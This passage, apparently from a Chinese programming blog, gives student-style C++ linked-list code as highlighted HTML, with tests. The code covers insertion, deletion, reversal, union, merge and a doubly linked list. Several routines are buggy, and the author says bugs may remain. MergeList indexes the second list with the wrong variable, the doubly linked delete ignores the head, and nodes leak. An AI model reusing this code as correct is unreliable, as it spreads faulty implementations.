class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(Node *p=L-&gt;head; p; p=p-&gt;nxt) &#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(e == p-&gt;d) <span class="keyword">return</span> counter;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PriorElem</span><span class="params">(ADTList *L, <span class="keyword">int</span> cur_e, <span class="keyword">int</span> &amp;pre_e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> loc = LocateElem(L, cur_e);</span><br><span class="line">    GetElem(L, loc<span class="number">-1</span>, pre_e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NextElem</span><span class="params">(ADTList *L, <span class="keyword">int</span> cur_e, <span class="keyword">int</span> &amp;next_e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> loc = LocateElem(L, cur_e);</span><br><span class="line">    GetElem(L, loc+<span class="number">1</span>, next_e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">void PriorElem(ADTList *L, int cur_e, int &amp;pre_e) &#123;</span></span><br><span class="line"><span class="comment">if(L == NULL || L-&gt;size&lt;2) &#123;</span></span><br><span class="line"><span class="comment">pre_e = 0;</span></span><br><span class="line"><span class="comment">return;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">for(Node *p=L-&gt;head-&gt;nxt, *q=L-&gt;head; p; q=p, p=p-&gt;nxt) &#123;</span></span><br><span class="line"><span class="comment">if(cur_e == p-&gt;d) &#123; pre_e = q-&gt;d; return; &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">pre_e = 0; return;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">void NextElem(ADTList *L, int cur_e, int &amp;next_e) &#123;</span></span><br><span class="line"><span class="comment">if(L == NULL || L-&gt;size&lt;2) &#123; next_e = 0; return; &#125;</span></span><br><span class="line"><span class="comment">for(Node *p=L-&gt;head; p; p=p-&gt;nxt) &#123;</span></span><br><span class="line"><span class="comment">if(cur_e == p-&gt;d &amp;&amp; p-&gt;nxt != NULL) &#123; next_e = p-&gt;nxt-&gt;d; return; &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">next_e = 0; return;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListInsert</span><span class="params">(ADTList* &amp;L, <span class="keyword">int</span> i, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span> || i&lt;<span class="number">1</span> || i&gt;ListLength(L)+<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">1</span>) &#123;</span><br><span class="line">        Node *p = <span class="keyword">new</span> Node();</span><br><span class="line">        p-&gt;d = e; p-&gt;nxt = L-&gt;head;</span><br><span class="line">        L-&gt;head = p; L-&gt;size++;</span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    Node *p = L-&gt;head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>; j&lt;i; j++, p=p-&gt;nxt);</span><br><span class="line">    Node *tmp = p-&gt;nxt;</span><br><span class="line">    p-&gt;nxt = <span class="keyword">new</span> Node();</span><br><span class="line">    p-&gt;nxt-&gt;d = e, p-&gt;nxt-&gt;nxt = tmp;</span><br><span class="line">    L-&gt;size++;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListDelete</span><span class="params">(ADTList* &amp;L, <span class="keyword">int</span> i, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span> || i&lt;<span class="number">1</span> || i&gt;ListLength(L)) &#123; e=<span class="number">0</span>; <span class="keyword">return</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">1</span>) &#123;</span><br><span class="line">        e = L-&gt;head-&gt;d;</span><br><span class="line">        L-&gt;head = L-&gt;head-&gt;nxt; L-&gt;size--;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Node *p = L-&gt;head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>; j&lt;i; j++, p=p-&gt;nxt);</span><br><span class="line">    e = p-&gt;nxt-&gt;d;</span><br><span class="line">    p-&gt;nxt = p-&gt;nxt-&gt;nxt;</span><br><span class="line">    L-&gt;size--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListTraverse</span><span class="params">(ADTList* L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(Node *p=L-&gt;head; p; p=p-&gt;nxt) <span class="built_in">printf</span>(<span class="string">"%d%c"</span>, p-&gt;d, <span class="string">" -"</span>[p-&gt;nxt!=<span class="literal">NULL</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关测试代码…可能还是有bug的<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ADTList *L;</span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListEmpty(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListInsert(L, <span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListInsert(L, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListInsert(L, <span class="number">2</span>, <span class="number">5</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListInsert(L, <span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListLength(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    ListDelete(L, <span class="number">2</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListLength(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"----------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    ListInsert(L, <span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line">    ListTraverse(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"ok"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListLength(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    NextElem(L, <span class="number">6</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    PriorElem(L, <span class="number">6</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    NextElem(L, <span class="number">7</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    GetElem(L, <span class="number">3</span>, x);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListEmpty(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    DestoryList(L);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; ListEmpty(L) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="单链表操作-翻转"><a href="#单链表操作-翻转" class="headerlink" title="单链表操作 - 翻转"></a>单链表操作 - 翻转</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListReverse</span><span class="params">(ADTList *L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    Node *p, *q, *r;</span><br><span class="line">    <span class="keyword">for</span>(p=L-&gt;head, q=<span class="literal">NULL</span>, r; p; p=r) &#123;</span><br><span class="line">        r = p-&gt;nxt;</span><br><span class="line">        p-&gt;nxt = q;</span><br><span class="line">        q = p;</span><br><span class="line">    &#125; L-&gt;head = q;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ADTList *La;</span><br><span class="line">    InitList(La);</span><br><span class="line">    ListInsert(La, <span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">    ListInsert(La, <span class="number">1</span>, <span class="number">9</span>);</span><br><span class="line">    ListInsert(La, <span class="number">1</span>, <span class="number">7</span>);</span><br><span class="line">    ListTraverse(La);</span><br><span class="line">    ListReverse(La);</span><br><span class="line">    ListTraverse(La);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="多链表操作"><a href="#多链表操作" class="headerlink" title="多链表操作"></a>多链表操作</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(ADTList* &amp;La, ADTList* Lb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> La_len=ListLength(La), Lb_len=ListLength(Lb);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=Lb_len; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> e;</span><br><span class="line">        GetElem(Lb, i, e);</span><br><span class="line">        <span class="keyword">if</span>(!LocateElem(La, e)) ListInsert(La, ++La_len, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnionWithOrder</span><span class="params">(ADTList* &amp;La, ADTList* Lb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> La_len = ListLength(La), Lb_len = ListLength(Lb);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=Lb_len; j++) &#123;</span><br><span class="line">        <span class="keyword">int</span> e_a, e_b; GetElem(Lb, j, e_b);</span><br><span class="line">        GetElem(La, i, e_a);</span><br><span class="line"><span class="comment">//        if(LocateElem(La, e_b)) continue;</span></span><br><span class="line">        <span class="keyword">while</span>(i&lt;=La_len &amp;&amp; e_a &lt; e_b) &#123; i++; GetElem(La, i, e_a); &#125;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; e_b &lt;&lt; <span class="string">" "</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        ListInsert(La, i, e_b); La_len++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeList</span><span class="params">(ADTList* La, ADTList* Lb, ADTList* &amp;Lc)</span> </span>&#123;</span><br><span class="line">    InitList(Lc);</span><br><span class="line">    <span class="keyword">int</span> La_len = ListLength(La), Lb_len = ListLength(Lb), Lc_len=ListLength(Lc);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>, j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>( ;i&lt;=La_len &amp;&amp; j&lt;=Lb_len; ) &#123;</span><br><span class="line">        <span class="keyword">int</span> e_a, e_b;</span><br><span class="line">        GetElem(La, i, e_a); GetElem(Lb, j, e_b);</span><br><span class="line">        <span class="keyword">if</span>(e_a &lt;= e_b) &#123; ListInsert(Lc, ++Lc_len, e_a); ++i; &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; ListInsert(Lc, ++Lc_len, e_b); ++j; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(; i&lt;=La_len; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> e_a; GetElem(La, i, e_a);</span><br><span class="line">        ListInsert(Lc, ++Lc_len, e_a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(; j&lt;=Lb_len; j++) &#123;</span><br><span class="line">        <span class="keyword">int</span> e_b; GetElem(Lb, i, e_b);</span><br><span class="line">        ListInsert(Lc, ++Lc_len, e_b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关测试代码，同上…可能有错<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ADTList *La, *Lb;</span><br><span class="line">    InitList(La); InitList(Lb);</span><br><span class="line">    ListInsert(La, <span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">    ListInsert(La, <span class="number">1</span>, <span class="number">9</span>);</span><br><span class="line">    ListInsert(La, <span class="number">1</span>, <span class="number">7</span>);</span><br><span class="line">    ListTraverse(La);</span><br><span class="line">    </span><br><span class="line">    ListInsert(Lb, <span class="number">1</span>, <span class="number">8</span>);</span><br><span class="line">    ListInsert(Lb, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    ListInsert(Lb, <span class="number">1</span>, <span class="number">5</span>);</span><br><span class="line">    ListTraverse(Lb);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    Union(La, Lb);</span></span><br><span class="line"><span class="comment">//    UnionWithOrder(La, Lb);</span></span><br><span class="line">    ADTList *Lc;</span><br><span class="line">    MergeList(La, Lb, Lc);</span><br><span class="line">    ListTraverse(Lc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">    Node *pre, *nxt;</span><br><span class="line">    Node() &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;data = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;pre = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;nxt = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DLL</span> &#123;</span> <span class="comment">// Double_Linked_List</span></span><br><span class="line">    Node *head;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    </span><br><span class="line">    DLL() &#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">this</span>-&gt;size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitList</span><span class="params">(DLL* &amp;L)</span> </span>&#123;</span><br><span class="line">    L = <span class="keyword">new</span> DLL();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DestoryList</span><span class="params">(DLL* &amp;L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;size != <span class="number">0</span>) <span class="keyword">delete</span> L;</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ClearList</span><span class="params">(DLL* &amp;L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;size) L = <span class="keyword">new</span> DLL();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListEmpty</span><span class="params">(DLL *L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;size) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ListLength</span><span class="params">(DLL *L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> L-&gt;size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetElem</span><span class="params">(DLL *L, <span class="keyword">int</span> i, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span> || i&lt;<span class="number">1</span> || i&gt;ListLength(L)) &#123; e=<span class="number">0</span>; <span class="keyword">return</span>; &#125;</span><br><span class="line">    Node *p=L-&gt;head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;i; j++)  p=p-&gt;nxt;</span><br><span class="line">    e=p-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LocateElem</span><span class="params">(DLL *L, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(Node *p=L-&gt;head; p; p=p-&gt;nxt) &#123;</span><br><span class="line">        ++counter;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;data == e) <span class="keyword">return</span> counter;</span><br><span class="line">    &#125; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PriorElem</span><span class="params">(DLL *L, <span class="keyword">int</span> cur_e, <span class="keyword">int</span> &amp;pre_e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> loc = LocateElem(L, cur_e);</span><br><span class="line">    GetElem(L, loc<span class="number">-1</span>, pre_e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">NextElem</span><span class="params">(DLL *L, <span class="keyword">int</span> cur_e, <span class="keyword">int</span> &amp;next_e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> loc = LocateElem(L, cur_e);</span><br><span class="line">    GetElem(L, loc+<span class="number">1</span>, next_e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListInsert</span><span class="params">(DLL* &amp;L, <span class="keyword">int</span> i, <span class="keyword">int</span> e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span> || i&lt;<span class="number">1</span> || i&gt;ListLength(L)+<span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">1</span>) &#123;</span><br><span class="line">        Node *q=<span class="keyword">new</span> Node();</span><br><span class="line">        q-&gt;data = e; q-&gt;nxt = L-&gt;head; q-&gt;pre = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span>(L-&gt;head) L-&gt;head-&gt;pre = q; L-&gt;head = q; L-&gt;size++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Node *p=L-&gt;head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;i<span class="number">-1</span>; j++) p=p-&gt;nxt;</span><br><span class="line">    Node *q = <span class="keyword">new</span> Node();</span><br><span class="line">    q-&gt;data = e; q-&gt;pre = p; q-&gt;nxt = p-&gt;nxt;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;nxt) p-&gt;nxt-&gt;pre = q;</span><br><span class="line">    p-&gt;nxt = q;</span><br><span class="line">    L-&gt;size++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListDelete</span><span class="params">(DLL* &amp;L, <span class="keyword">int</span> i, <span class="keyword">int</span> &amp;e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span> || i&lt;<span class="number">1</span> || i&gt;ListLength(L)) &#123; e=<span class="number">0</span>; <span class="keyword">return</span>; &#125;</span><br><span class="line">    Node *p = L-&gt;head; L-&gt;size--;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;i; j++) p=p-&gt;nxt;</span><br><span class="line">    e = p-&gt;data;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;pre) p-&gt;pre-&gt;nxt = p-&gt;nxt;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;nxt) p-&gt;nxt-&gt;pre = p-&gt;pre;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ListTraverse</span><span class="params">(DLL* L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(L==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(Node *p=L-&gt;head; p; p=p-&gt;nxt) <span class="built_in">printf</span>(<span class="string">"%d%c"</span>, p-&gt;data, <span class="string">" -"</span>[p-&gt;nxt!=<span class="literal">NULL</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关测试代码，用的上面的<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Test1</span><span 